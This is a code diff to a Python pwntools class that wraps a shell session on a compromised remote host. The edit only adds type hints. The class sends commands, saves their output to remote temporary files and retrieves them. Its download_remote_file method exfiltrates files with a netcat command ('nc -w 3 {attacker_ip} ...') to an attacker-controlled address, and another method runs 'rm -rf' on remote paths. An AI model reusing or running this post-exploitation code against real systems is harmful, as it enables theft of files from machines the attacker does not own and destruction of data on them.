@@ -1,11 +1,9 @@
 import hashlib
 import pwn
+from pwnlib.tubes.sock import sock
 
-'''
-pwnlib.tubes.sock wrapper
-'''
 class PwnlibSocketWrapper:
-    def __init__(self, client, expected_prompt, attacker_ip):
+    def __init__(self, client: sock, expected_prompt: str, attacker_ip: str):
         self.client = client
         self.expected_prompt = expected_prompt
         self.attacker_ip = attacker_ip
@@ -17,7 +15,7 @@ class PwnlibSocketWrapper:
     def ignore_until_prompt(self):
         self.client.recvuntil(self.expected_prompt)
 
-    def send_command_read_output(self, command_bytes, single_line_output=False):
+    def send_command_read_output(self, command_bytes: bytes, single_line_output=False) -> str:
         self.ignore_until_prompt()
         self.client.sendline(command_bytes)
         self.client.recvuntil(command_bytes + b'\n')
@@ -32,7 +30,7 @@ class PwnlibSocketWrapper:
 
         return output.strip()
 
-    def send_command_temporary_file(self, command_bytes):
+    def send_command_temporary_file(self, command_bytes: bytes) -> str:
         hash_str = hashlib.md5(command_bytes).hexdigest()
         output_remote_temporary_file = self.remote_output_folder + hash_str
 
@@ -43,7 +41,7 @@ class PwnlibSocketWrapper:
         self.client.sendline(command_bytes)
         return output_remote_temporary_file
 
-    def download_remote_file(self, remote_path):
+    def download_remote_file(self, remote_path: str) -> str:
         download_command = f'nc -w 3 {self.attacker_ip} {self.netcat_file_transfer_port} < {remote_path}'.encode()
         self.client.sendline(download_command)
 
@@ -53,16 +51,16 @@ class PwnlibSocketWrapper:
 
         return downloaded_output.decode(self.encoding)
 
-    def delete_remote_file(self, remote_path):
+    def delete_remote_file(self, remote_path: str):
         remove_command = f'rm -rf {remote_path}'.encode()
         self.client.sendline(remove_command)
 
-    def remote_file_exists(self, remote_path):
+    def remote_file_exists(self, remote_path: str) -> bool:
         file_exists_command = f'file {remote_path}'.encode()
         output = self.send_command_read_output(file_exists_command, single_line_output=True)
         return 'No such file or directory' not in output and ': empty' not in output
 
-    def send_command_read_cached_temporary_file(self, command_bytes):
+    def send_command_read_cached_temporary_file(self, command_bytes: bytes) -> str:
         remote_temporary_file = self.send_command_temporary_file(command_bytes)
         output = self.download_remote_file(remote_temporary_file)
         return output
